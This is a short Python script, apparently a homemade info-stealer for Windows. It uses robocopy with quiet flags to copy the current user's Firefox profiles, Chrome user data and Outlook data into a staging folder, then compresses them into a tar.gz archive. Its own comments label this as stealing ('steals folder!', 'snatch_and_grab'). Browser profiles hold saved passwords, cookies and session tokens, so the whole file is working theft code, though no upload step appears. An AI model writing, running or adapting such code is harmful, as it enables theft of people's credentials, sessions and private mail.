from subprocess import call
import subprocess
import os
import tarfile

##calls the user profile for current sign in
##  %USERPROFILE%
## com_user = subprocess.run(["whoami"],stdout=subprocess.PIPE)
### print(com_user.stdout.decode('utf-8'))
#### location of fire fox profiles
## C:\Users\penafiej\AppData\Roaming\Mozilla\Firefox\Profiles
## location using VARS  %USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles

##kill_chrome = subprocess.run(['taskkill', [chrome_pro]], stdout=subprocess.PIPE)

## command to copy
## robocopy /E %USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles ./

## these vars need to remain global until final func
## current user and final location

logged_user_dir = '%USERPROFILE%'
firefox_profile_loc = '%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles'
## fix is for the space problem when using cmd with paths
chrome_fix = "'Chrome User'"
chrome_profile_loc = '{}\AppData\Local\Google\Chrome'.format(logged_user_dir)
folder_loc = '{}\lmao'.format(logged_user_dir)
##this is the split for os fix problems
logged_user_os_fix = os.environ['USERPROFILE']
folder_loc_for_fix = '{}\lmao'.format(logged_user_os_fix)
## end of split for os fix
outlook_loc = '{}\AppData\Local\Microsoft\Outlook'.format(logged_user_dir)
make_folder = os.system('mkdir {}'.format(folder_loc))
#this is how i make the folder
#make_folder = os.system('mkdir {}'.format(folder_loc))
#func to make and check folder!
#everything here and down will work with out the top vars

def folder_make_and_check(x):
    folder_code = str(x)
    if folder_code == '0':
        print('folder created')
    elif folder_code == '1':
        print('folder is made already')
        os.system('rmdir {} /S /Q'.format(folder_loc))
        make_folder = os.system('mkdir {}'.format(folder_loc))
    else:
        print('failed improper permissions')
    print(x)
#steals folder! process must be killed  and a nice compress
def Profile_steal_with_compress():
    os.system('robocopy /E {} {} /NFL /NDL /NJH /NJS /nc /ns /np'.format(firefox_profile_loc,folder_loc))
    os.system('robocopy /E {} {} /NFL /NDL /NJH /NJS /nc /ns /np'.format(chrome_profile_loc,folder_loc_for_fix))
    os.system('robocopy /E {} {} /NFL /NDL /NJH /NJS /nc /ns /np'.format(outlook_loc, folder_loc))
    tar = tarfile.open('{}\lmao.tar.gz'.format(logged_user_os_fix), 'w:gz')
    tar.add(folder_loc_for_fix, arcname='lmao')
    tar.close()

#CHECK to see if open while copying causes a problem
def snatch_and_grab():
    folder_make_and_check(make_folder)
    Profile_steal_with_compress()

snatch_and_grab()












